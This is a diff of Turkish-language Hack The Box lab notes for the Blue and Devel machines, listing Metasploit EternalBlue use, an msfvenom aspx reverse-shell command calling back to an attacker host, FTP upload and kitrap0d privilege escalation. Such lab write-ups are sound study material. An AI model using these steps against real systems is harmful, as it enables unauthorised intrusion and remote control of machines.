@@ -24,18 +24,21 @@ Bu bölümde bazı Hack The Box makinelerinin çözümlerine yönelik kısa notl
 - Google -> smb Windows 7 Professional 7601 exploit -> rapid7
 - msfconsole
   -use exploit/windows/smb/ms17_010_eternalblue
+- [python exploit github](https://github.com/3ndG4me/AutoBlue-MS17-010)
 - NT AUTHORITY\SYSTEM (Pwned)
+
 
 ## Devel (windows)
 - nmap -A -T4 -p- IP
 - ftp (anonymous) login
 - ftp dosyaları == microsoft iis dosyaları
 - msfvenom -> aspx reverseshell (msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f aspx > shell.aspx)
-- ftp put shell.aspx
+- ftp put shell.aspx (burada herhangi bir hata ile karşılaşma durumunda binary komutu kullanılabilir)
 - msfconsole multi handler
 - tarayıcı -> http://IP/shell.aspx -> meterpreter(IIS APPPOOL\Web)
-- background -> 
-- use post/multi/recon/local_exploit_suggester -> exploit/windows/local/ms10_015_kitrap0d
+- background ->  (search suggester)
+- [post exploitation enumeration]
+- use post/multi/recon/local_exploit_suggester  -> exploit/windows/local/ms10_015_kitrap0d 
 - use exploit/windows/local/ms10_015_kitrap0d
 - ps
 - migrate (notepad PID)
